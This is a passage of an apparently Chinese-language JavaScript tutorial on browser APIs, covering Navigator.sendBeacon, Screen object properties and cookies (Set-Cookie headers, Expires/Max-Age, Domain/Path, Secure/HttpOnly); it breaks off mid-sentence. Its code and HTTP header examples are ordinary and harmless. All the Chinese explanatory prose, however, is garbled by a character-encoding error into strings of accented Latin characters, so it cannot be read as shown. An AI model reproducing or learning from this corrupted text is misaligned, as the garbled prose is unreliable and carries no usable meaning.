</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="navigator-sendbeacon"><a href="#navigator-sendbeacon" class="header-anchor">#</a> Navigator.sendBeacon()</h3> <p><code>Navigator.sendBeacon()</code>æ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨å¼‚æ­¥å‘é€æ•°æ®ï¼Œè¯¦è§ã€ŠXMLHttpRequest å¯¹è±¡ã€‹ä¸€ç« ã€‚</p> <h2 id="_3-screen-å¯¹è±¡"><a href="#_3-screen-å¯¹è±¡" class="header-anchor">#</a> 3.Screen å¯¹è±¡</h2> <p>Screen å¯¹è±¡è¡¨ç¤ºå½“å‰çª—å£æ‰€åœ¨çš„å±å¹•ï¼Œæä¾›æ˜¾ç¤ºè®¾å¤‡çš„ä¿¡æ¯ã€‚<code>window.screen</code>å±æ€§æŒ‡å‘è¿™ä¸ªå¯¹è±¡ã€‚</p> <p>è¯¥å¯¹è±¡æœ‰ä¸‹é¢çš„å±æ€§ã€‚</p> <ul><li><code>Screen.height</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚é™¤éè°ƒæ•´æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ï¼Œå¦åˆ™è¿™ä¸ªå€¼å¯ä»¥çœ‹ä½œå¸¸é‡ï¼Œä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ˜¾ç¤ºå™¨çš„åˆ†è¾¨ç‡ä¸æµè§ˆå™¨è®¾ç½®æ— å…³ï¼Œç¼©æ”¾ç½‘é¡µå¹¶ä¸ä¼šæ”¹å˜åˆ†è¾¨ç‡ã€‚</li> <li><code>Screen.width</code>ï¼šæµè§ˆå™¨çª—å£æ‰€åœ¨çš„å±å¹•çš„å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li> <li><code>Screen.availHeight</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•é«˜åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚å› ä¸ºéƒ¨åˆ†ç©ºé—´å¯èƒ½ä¸å¯ç”¨ï¼Œæ¯”å¦‚ç³»ç»Ÿçš„ä»»åŠ¡æ æˆ–è€… Mac ç³»ç»Ÿå±å¹•åº•éƒ¨çš„ Dock åŒºï¼Œè¿™ä¸ªå±æ€§ç­‰äº<code>height</code>å‡å»é‚£äº›è¢«ç³»ç»Ÿç»„ä»¶çš„é«˜åº¦ã€‚</li> <li><code>Screen.availWidth</code>ï¼šæµè§ˆå™¨çª—å£å¯ç”¨çš„å±å¹•å®½åº¦ï¼ˆå•ä½åƒç´ ï¼‰ã€‚</li> <li><code>Screen.pixelDepth</code>ï¼šæ•´æ•°ï¼Œè¡¨ç¤ºå±å¹•çš„è‰²å½©ä½æ•°ï¼Œæ¯”å¦‚<code>24</code>è¡¨ç¤ºå±å¹•æä¾›24ä½è‰²å½©ã€‚</li> <li><code>Screen.colorDepth</code>ï¼š<code>Screen.pixelDepth</code>çš„åˆ«åã€‚ä¸¥æ ¼åœ°è¯´ï¼ŒcolorDepth è¡¨ç¤ºåº”ç”¨ç¨‹åºçš„é¢œè‰²æ·±åº¦ï¼ŒpixelDepth è¡¨ç¤ºå±å¹•çš„é¢œè‰²æ·±åº¦ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒä»¬éƒ½æ˜¯åŒä¸€ä»¶äº‹ã€‚</li> <li><code>Screen.orientation</code>ï¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºå±å¹•çš„æ–¹å‘ã€‚è¯¥å¯¹è±¡çš„<code>type</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå±å¹•çš„å…·ä½“æ–¹å‘ï¼Œ<code>landscape-primary</code>è¡¨ç¤ºæ¨ªæ”¾ï¼Œ<code>landscape-secondary</code>è¡¨ç¤ºé¢ å€’çš„æ¨ªæ”¾ï¼Œ<code>portrait-primary</code>è¡¨ç¤ºç«–æ”¾ï¼Œ<code>portrait-secondary</code>ã€‚</li></ul> <p>ä¸‹é¢æ˜¯<code>Screen.orientation</code>çš„ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>orientation
<span class="token comment">// { angle: 0, type: &quot;landscape-primary&quot;, onchange: null }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸‹é¢çš„ä¾‹å­ä¿è¯å±å¹•åˆ†è¾¨ç‡å¤§äº 1024 x 768ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>width <span class="token operator">&gt;=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> window<span class="token punctuation">.</span>screen<span class="token punctuation">.</span>height <span class="token operator">&gt;=</span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// åˆ†è¾¨ç‡ä¸ä½äº 1024x768</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸‹é¢æ˜¯æ ¹æ®å±å¹•çš„å®½åº¦ï¼Œå°†ç”¨æˆ·å¯¼å‘ä¸åŒç½‘é¡µçš„ä»£ç ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>screen<span class="token punctuation">.</span>width <span class="token operator">&lt;=</span> <span class="token number">800</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>screen<span class="token punctuation">.</span>height <span class="token operator">&lt;=</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'small.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'wide.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="å››ã€cookie"><a href="#å››ã€cookie" class="header-anchor">#</a> å››ã€Cookie</h2> <h2 id="_1-æ¦‚è¿°"><a href="#_1-æ¦‚è¿°" class="header-anchor">#</a> 1.æ¦‚è¿°</h2> <p>Cookie æ˜¯æœåŠ¡å™¨ä¿å­˜åœ¨æµè§ˆå™¨çš„ä¸€å°æ®µæ–‡æœ¬ä¿¡æ¯ï¼Œä¸€èˆ¬å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚æµè§ˆå™¨æ¯æ¬¡å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå°±ä¼šè‡ªåŠ¨é™„ä¸Šè¿™æ®µä¿¡æ¯ã€‚</p> <p>Cookie ä¸»è¦ä¿å­˜çŠ¶æ€ä¿¡æ¯ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›ä¸»è¦ç”¨é€”ã€‚</p> <ul><li>å¯¹è¯ï¼ˆsessionï¼‰ç®¡ç†ï¼šä¿å­˜ç™»å½•ã€è´­ç‰©è½¦ç­‰éœ€è¦è®°å½•çš„ä¿¡æ¯ã€‚</li> <li>ä¸ªæ€§åŒ–ä¿¡æ¯ï¼šä¿å­˜ç”¨æˆ·çš„åå¥½ï¼Œæ¯”å¦‚ç½‘é¡µçš„å­—ä½“å¤§å°ã€èƒŒæ™¯è‰²ç­‰ç­‰ã€‚</li> <li>è¿½è¸ªç”¨æˆ·ï¼šè®°å½•å’Œåˆ†æç”¨æˆ·è¡Œä¸ºã€‚</li></ul> <p>Cookie ä¸æ˜¯ä¸€ç§ç†æƒ³çš„å®¢æˆ·ç«¯å‚¨å­˜æœºåˆ¶ã€‚å®ƒçš„å®¹é‡å¾ˆå°ï¼ˆ4KBï¼‰ï¼Œç¼ºä¹æ•°æ®æ“ä½œæ¥å£ï¼Œè€Œä¸”ä¼šå½±å“æ€§èƒ½ã€‚å®¢æˆ·ç«¯å‚¨å­˜åº”è¯¥ä½¿ç”¨ Web storage API å’Œ IndexedDBã€‚åªæœ‰é‚£äº›æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è®©æœåŠ¡å™¨çŸ¥é“çš„ä¿¡æ¯ï¼Œæ‰åº”è¯¥æ”¾åœ¨ Cookie é‡Œé¢ã€‚</p> <p>æ¯ä¸ª Cookie éƒ½æœ‰ä»¥ä¸‹å‡ æ–¹é¢çš„å…ƒæ•°æ®ã€‚</p> <ul><li>Cookie çš„åå­—</li> <li>Cookie çš„å€¼ï¼ˆçœŸæ­£çš„æ•°æ®å†™åœ¨è¿™é‡Œé¢ï¼‰</li> <li>åˆ°æœŸæ—¶é—´ï¼ˆè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå¤±æ•ˆï¼‰</li> <li>æ‰€å±åŸŸåï¼ˆé»˜è®¤ä¸ºå½“å‰åŸŸåï¼‰</li> <li>ç”Ÿæ•ˆçš„è·¯å¾„ï¼ˆé»˜è®¤ä¸ºå½“å‰ç½‘å€ï¼‰</li></ul> <p>ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·è®¿é—®ç½‘å€<code>www.example.com</code>ï¼ŒæœåŠ¡å™¨åœ¨æµè§ˆå™¨å†™å…¥ä¸€ä¸ª Cookieã€‚è¿™ä¸ª Cookie çš„æ‰€å±åŸŸåä¸º<code>www.example.com</code>ï¼Œç”Ÿæ•ˆè·¯å¾„ä¸ºæ ¹è·¯å¾„<code>/</code>ã€‚å¦‚æœ Cookie çš„ç”Ÿæ•ˆè·¯å¾„è®¾ä¸º<code>/forums</code>ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie åªæœ‰åœ¨è®¿é—®<code>www.example.com/forums</code>åŠå…¶å­è·¯å¾„æ—¶æ‰æœ‰æ•ˆã€‚ä»¥åï¼Œæµè§ˆå™¨è®¿é—®æŸä¸ªè·¯å¾„ä¹‹å‰ï¼Œå°±ä¼šæ‰¾å‡ºå¯¹è¯¥åŸŸåå’Œè·¯å¾„æœ‰æ•ˆï¼Œå¹¶ä¸”è¿˜æ²¡æœ‰åˆ°æœŸçš„ Cookieï¼Œä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ã€‚</p> <p>ç”¨æˆ·å¯ä»¥è®¾ç½®æµè§ˆå™¨ä¸æ¥å— Cookieï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä¸å‘æœåŠ¡å™¨å‘é€ Cookieã€‚<code>window.navigator.cookieEnabled</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæµè§ˆå™¨æ˜¯å¦æ‰“å¼€ Cookie åŠŸèƒ½ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>window<span class="token punctuation">.</span>navigator<span class="token punctuation">.</span>cookieEnabled <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><code>document.cookie</code>å±æ€§è¿”å›å½“å‰ç½‘é¡µçš„ Cookieã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token comment">// &quot;id=foo;key=bar&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸åŒæµè§ˆå™¨å¯¹ Cookie æ•°é‡å’Œå¤§å°çš„é™åˆ¶ï¼Œæ˜¯ä¸ä¸€æ ·çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå•ä¸ªåŸŸåè®¾ç½®çš„ Cookie ä¸åº”è¶…è¿‡30ä¸ªï¼Œæ¯ä¸ª Cookie çš„å¤§å°ä¸èƒ½è¶…è¿‡4KBã€‚è¶…è¿‡é™åˆ¶ä»¥åï¼ŒCookie å°†è¢«å¿½ç•¥ï¼Œä¸ä¼šè¢«è®¾ç½®ã€‚</p> <p>æµè§ˆå™¨çš„åŒæºæ”¿ç­–è§„å®šï¼Œä¸¤ä¸ªç½‘å€åªè¦åŸŸåç›¸åŒï¼Œå°±å¯ä»¥å…±äº« Cookieï¼ˆå‚è§ã€ŠåŒæºæ”¿ç­–ã€‹ä¸€ç« ï¼‰ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¸è¦æ±‚åè®®ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>http://example.com</code>è®¾ç½®çš„ Cookieï¼Œå¯ä»¥è¢«<code>https://example.com</code>è¯»å–ã€‚</p> <h2 id="_2-cookie-ä¸-http-åè®®"><a href="#_2-cookie-ä¸-http-åè®®" class="header-anchor">#</a> 2.Cookie ä¸ HTTP åè®®</h2> <p>Cookie ç”± HTTP åè®®ç”Ÿæˆï¼Œä¹Ÿä¸»è¦æ˜¯ä¾› HTTP åè®®ä½¿ç”¨ã€‚</p> <h3 id="http-å›åº”ï¼šcookie-çš„ç”Ÿæˆ"><a href="#http-å›åº”ï¼šcookie-çš„ç”Ÿæˆ" class="header-anchor">#</a> HTTP å›åº”ï¼šCookie çš„ç”Ÿæˆ</h3> <p>æœåŠ¡å™¨å¦‚æœå¸Œæœ›åœ¨æµè§ˆå™¨ä¿å­˜ Cookieï¼Œå°±è¦åœ¨ HTTP å›åº”çš„å¤´ä¿¡æ¯é‡Œé¢ï¼Œæ”¾ç½®ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span>foo=bar
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç ä¼šåœ¨æµè§ˆå™¨ä¿å­˜ä¸€ä¸ªåä¸º<code>foo</code>çš„ Cookieï¼Œå®ƒçš„å€¼ä¸º<code>bar</code>ã€‚</p> <p>HTTP å›åº”å¯ä»¥åŒ…å«å¤šä¸ª<code>Set-Cookie</code>å­—æ®µï¼Œå³åœ¨æµè§ˆå™¨ç”Ÿæˆå¤šä¸ª Cookieã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.0 <span class="token property">200 OK</span></span>
<span class="token header-name keyword">Content-type:</span> text/html
<span class="token header-name keyword">Set-Cookie:</span> yummy_cookie=choco
<span class="token header-name keyword">Set-Cookie:</span> tasty_cookie=strawberry<span class="token text-html">

[page content]
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>é™¤äº† Cookie çš„å€¼ï¼Œ<code>Set-Cookie</code>å­—æ®µè¿˜å¯ä»¥é™„åŠ  Cookie çš„å±æ€§ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
<span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
<span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
<span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
<span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
<span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢çš„å‡ ä¸ªå±æ€§çš„å«ä¹‰ï¼Œå°†åœ¨åæ–‡è§£é‡Šã€‚</p> <p>ä¸€ä¸ª<code>Set-Cookie</code>å­—æ®µé‡Œé¢ï¼Œå¯ä»¥åŒæ—¶åŒ…æ‹¬å¤šä¸ªå±æ€§ï¼Œæ²¡æœ‰æ¬¡åºçš„è¦æ±‚ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¦‚æœæœåŠ¡å™¨æƒ³æ”¹å˜ä¸€ä¸ªæ—©å…ˆè®¾ç½®çš„ Cookieï¼Œå¿…é¡»åŒæ—¶æ»¡è¶³å››ä¸ªæ¡ä»¶ï¼šCookie çš„<code>key</code>ã€<code>domain</code>ã€<code>path</code>å’Œ<code>secure</code>éƒ½åŒ¹é…ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåŸå§‹çš„ Cookie æ˜¯ç”¨å¦‚ä¸‹çš„<code>Set-Cookie</code>è®¾ç½®çš„ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> key1=value1; domain=example.com; path=/blog
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>æ”¹å˜ä¸Šé¢è¿™ä¸ª Cookie çš„å€¼ï¼Œå°±å¿…é¡»ä½¿ç”¨åŒæ ·çš„<code>Set-Cookie</code>ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> key1=value2; domain=example.com; path=/blog
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>åªè¦æœ‰ä¸€ä¸ªå±æ€§ä¸åŒï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªå…¨æ–°çš„ Cookieï¼Œè€Œä¸æ˜¯æ›¿æ¢æ‰åŸæ¥é‚£ä¸ª Cookieã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> key1=value2; domain=example.com; path=/
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢çš„å‘½ä»¤è®¾ç½®äº†ä¸€ä¸ªå…¨æ–°çš„åŒå Cookieï¼Œä½†æ˜¯<code>path</code>å±æ€§ä¸ä¸€æ ·ã€‚ä¸‹ä¸€æ¬¡è®¿é—®<code>example.com/blog</code>çš„æ—¶å€™ï¼Œæµè§ˆå™¨å°†å‘æœåŠ¡å™¨å‘é€ä¸¤ä¸ªåŒåçš„ Cookieã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Cookie:</span> key1=value1; key1=value2
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç çš„ä¸¤ä¸ª Cookie æ˜¯åŒåçš„ï¼ŒåŒ¹é…è¶Šç²¾ç¡®çš„ Cookie æ’åœ¨è¶Šå‰é¢ã€‚</p> <h3 id="http-è¯·æ±‚ï¼šcookie-çš„å‘é€"><a href="#http-è¯·æ±‚ï¼šcookie-çš„å‘é€" class="header-anchor">#</a> HTTP è¯·æ±‚ï¼šCookie çš„å‘é€</h3> <p>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Šç›¸åº”çš„ Cookieã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒæŠŠæœåŠ¡å™¨æ—©å‰ä¿å­˜åœ¨æµè§ˆå™¨çš„è¿™æ®µä¿¡æ¯ï¼Œå†å‘å›æœåŠ¡å™¨ã€‚è¿™æ—¶è¦ä½¿ç”¨ HTTP å¤´ä¿¡æ¯çš„<code>Cookie</code>å­—æ®µã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Cookie:</span> foo=bar
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç ä¼šå‘æœåŠ¡å™¨å‘é€åä¸º<code>foo</code>çš„ Cookieï¼Œå€¼ä¸º<code>bar</code>ã€‚</p> <p><code>Cookie</code>å­—æ®µå¯ä»¥åŒ…å«å¤šä¸ª Cookieï¼Œä½¿ç”¨åˆ†å·ï¼ˆ<code>;</code>ï¼‰åˆ†éš”ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Cookie:</span> name=value; name2=value2; name3=value3
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /sample_page.html HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> www.example.org
<span class="token header-name keyword">Cookie:</span> yummy_cookie=choco; tasty_cookie=strawberry
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>æœåŠ¡å™¨æ”¶åˆ°æµè§ˆå™¨å‘æ¥çš„ Cookie æ—¶ï¼Œæœ‰ä¸¤ç‚¹æ˜¯æ— æ³•çŸ¥é“çš„ã€‚</p> <ul><li>Cookie çš„å„ç§å±æ€§ï¼Œæ¯”å¦‚ä½•æ—¶è¿‡æœŸã€‚</li> <li>å“ªä¸ªåŸŸåè®¾ç½®çš„ Cookieï¼Œåˆ°åº•æ˜¯ä¸€çº§åŸŸåè®¾çš„ï¼Œè¿˜æ˜¯æŸä¸€ä¸ªäºŒçº§åŸŸåè®¾çš„ã€‚</li></ul> <h2 id="_3-cookie-çš„å±æ€§"><a href="#_3-cookie-çš„å±æ€§" class="header-anchor">#</a> 3.Cookie çš„å±æ€§</h2> <h3 id="expiresï¼Œmax-age"><a href="#expiresï¼Œmax-age" class="header-anchor">#</a> Expiresï¼ŒMax-Age</h3> <p><code>Expires</code>å±æ€§æŒ‡å®šä¸€ä¸ªå…·ä½“çš„åˆ°æœŸæ—¶é—´ï¼Œåˆ°äº†æŒ‡å®šæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚å®ƒçš„å€¼æ˜¯ UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>å¦‚æœä¸è®¾ç½®è¯¥å±æ€§ï¼Œæˆ–è€…è®¾ä¸º<code>null</code>ï¼ŒCookie åªåœ¨å½“å‰ä¼šè¯ï¼ˆsessionï¼‰æœ‰æ•ˆï¼Œæµè§ˆå™¨çª—å£ä¸€æ—¦å…³é—­ï¼Œå½“å‰ Session ç»“æŸï¼Œè¯¥ Cookie å°±ä¼šè¢«åˆ é™¤ã€‚å¦å¤–ï¼Œæµè§ˆå™¨æ ¹æ®æœ¬åœ°æ—¶é—´ï¼Œå†³å®š Cookie æ˜¯å¦è¿‡æœŸï¼Œç”±äºæœ¬åœ°æ—¶é—´æ˜¯ä¸ç²¾ç¡®çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•ä¿è¯ Cookie ä¸€å®šä¼šåœ¨æœåŠ¡å™¨æŒ‡å®šçš„æ—¶é—´è¿‡æœŸã€‚</p> <p><code>Max-Age</code>å±æ€§æŒ‡å®šä»ç°åœ¨å¼€å§‹ Cookie å­˜åœ¨çš„ç§’æ•°ï¼Œæ¯”å¦‚<code>60 * 60 * 24 * 365</code>ï¼ˆå³ä¸€å¹´ï¼‰ã€‚è¿‡äº†è¿™ä¸ªæ—¶é—´ä»¥åï¼Œæµè§ˆå™¨å°±ä¸å†ä¿ç•™è¿™ä¸ª Cookieã€‚</p> <p>å¦‚æœåŒæ—¶æŒ‡å®šäº†<code>Expires</code>å’Œ<code>Max-Age</code>ï¼Œé‚£ä¹ˆ<code>Max-Age</code>çš„å€¼å°†ä¼˜å…ˆç”Ÿæ•ˆã€‚</p> <p>å¦‚æœ<code>Set-Cookie</code>å­—æ®µæ²¡æœ‰æŒ‡å®š<code>Expires</code>æˆ–<code>Max-Age</code>å±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ª Cookie å°±æ˜¯ Session Cookieï¼Œå³å®ƒåªåœ¨æœ¬æ¬¡å¯¹è¯å­˜åœ¨ï¼Œä¸€æ—¦ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¸ä¼šå†ä¿ç•™è¿™ä¸ª Cookieã€‚</p> <h3 id="domainï¼Œpath"><a href="#domainï¼Œpath" class="header-anchor">#</a> Domainï¼ŒPath</h3> <p><code>Domain</code>å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›åŸŸåè¦é™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§ï¼Œæµè§ˆå™¨ä¼šé»˜è®¤å°†å…¶è®¾ä¸ºå½“å‰åŸŸåï¼Œè¿™æ—¶å­åŸŸåå°†ä¸ä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ<code>example.com</code>ä¸è®¾ç½® Cookie çš„<code>domain</code>å±æ€§ï¼Œé‚£ä¹ˆ<code>sub.example.com</code>å°†ä¸ä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæŒ‡å®šäº†<code>domain</code>å±æ€§ï¼Œé‚£ä¹ˆå­åŸŸåä¹Ÿä¼šé™„å¸¦è¿™ä¸ª Cookieã€‚å¦‚æœæœåŠ¡å™¨æŒ‡å®šçš„åŸŸåä¸å±äºå½“å‰åŸŸåï¼Œæµè§ˆå™¨ä¼šæ‹’ç»è¿™ä¸ª Cookieã€‚</p> <p><code>Path</code>å±æ€§æŒ‡å®šæµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œå“ªäº›è·¯å¾„è¦é™„å¸¦è¿™ä¸ª Cookieã€‚åªè¦æµè§ˆå™¨å‘ç°ï¼Œ<code>Path</code>å±æ€§æ˜¯ HTTP è¯·æ±‚è·¯å¾„çš„å¼€å¤´ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šåœ¨å¤´ä¿¡æ¯é‡Œé¢å¸¦ä¸Šè¿™ä¸ª Cookieã€‚æ¯”å¦‚ï¼Œ<code>PATH</code>å±æ€§æ˜¯<code>/</code>ï¼Œé‚£ä¹ˆè¯·æ±‚<code>/docs</code>è·¯å¾„ä¹Ÿä¼šåŒ…å«è¯¥ Cookieã€‚å½“ç„¶ï¼Œå‰ææ˜¯åŸŸåå¿…é¡»ä¸€è‡´ã€‚</p> <h3 id="secureï¼Œhttponly"><a href="#secureï¼Œhttponly" class="header-anchor">#</a> Secureï¼ŒHttpOnly</h3> <p><code>Secure</code>å±æ€§æŒ‡å®šæµè§ˆå™¨åªæœ‰åœ¨åŠ å¯†åè®® HTTPS ä¸‹ï¼Œæ‰èƒ½å°†è¿™ä¸ª Cookie å‘é€åˆ°æœåŠ¡å™¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœå½“å‰åè®®æ˜¯ HTTPï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¿½ç•¥æœåŠ¡å™¨å‘æ¥çš„<code>Secure</code>å±æ€§ã€‚è¯¥å±æ€§åªæ˜¯ä¸€ä¸ªå¼€å…³ï¼Œä¸éœ€è¦æŒ‡å®šå€¼ã€‚å¦‚æœé€šä¿¡æ˜¯ HTTPS åè®®ï¼Œè¯¥å¼€å…³è‡ªåŠ¨æ‰“å¼€ã€‚</p> <p><code>HttpOnly</code>å±æ€§æŒ‡å®šè¯¥ Cookie æ— æ³•é€šè¿‡ JavaScript è„šæœ¬æ‹¿åˆ°ï¼Œä¸»è¦æ˜¯<code>document.cookie</code>å±æ€§ã€<code>XMLHttpRequest</code>å¯¹è±¡å’Œ Request API éƒ½æ‹¿ä¸åˆ°è¯¥å±æ€§ã€‚è¿™æ ·å°±é˜²æ­¢äº†è¯¥ Cookie 